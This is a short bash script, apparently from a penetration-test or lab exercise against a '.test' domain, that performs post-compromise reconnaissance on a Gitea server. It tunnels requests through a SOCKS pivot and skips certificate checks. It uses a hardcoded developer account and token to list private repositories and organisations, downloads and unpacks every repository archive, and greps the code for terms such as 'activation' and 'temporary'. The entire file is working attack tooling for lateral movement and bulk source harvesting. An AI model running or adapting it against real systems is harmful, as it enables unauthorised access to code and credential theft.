#!/bin/bash
# W05 recon: pull all Gitea repos and grep; check pivot + basic service health.
P="--socks5-hostname 127.0.0.1:1080"
CA=/tmp/ca.crt
[ -f $CA ] || true
A="-u rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo"
G=https://source.keplerops.test
echo "== pivot check =="
curl -sS $P -k -m 10 -o /dev/null -w 'source:%{http_code}\n' $G/api/v1/version
curl -sS $P -k -m 10 $A "$G/api/v1/user/repos?limit=100&page=1" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for r in d: print(r['full_name'], r['private'], r['default_branch'], r['size'])
" 2>&1 | head -40
echo "== orgs =="
curl -sS $P -k -m 10 $A "$G/api/v1/orgs" | head -c 500; echo
echo "== archive download + grep =="
mkdir -p /tmp/repos && cd /tmp/repos
for r in $(curl -sS $P -k -m 15 $A "$G/api/v1/user/repos?limit=100" | python3 -c "
import sys,json
for x in json.load(sys.stdin): print(x['full_name']+'|'+x['default_branch'])
"); do
  full=${r%|*}; br=${r#*|}
  fn=$(echo $full | tr / _)
  code=$(curl -sS $P -k -m 60 $A -L -o $fn.tgz -w '%{http_code}' "$G/api/v1/repos/$full/archive/$br.tar.gz")
  echo "DL $full@$br -> $code $(stat -c%s $fn.tgz 2>/dev/null)"
  mkdir -p $fn && tar xzf $fn.tgz -C $fn 2>/dev/null
done
echo "== grep for w05 terms =="
grep -ril -E "mira|vale|roster|activation|starter|temporary" /tmp/repos --include="*.py" --include="*.js" --include="*.ts" --include="*.json" --include="*.md" --include="*.yml" --include="*.yaml" --include="*.go" --include="*.txt" 2>/dev/null | head -40
echo "== dirs =="
find /tmp/repos -maxdepth 3 -type d | head -60
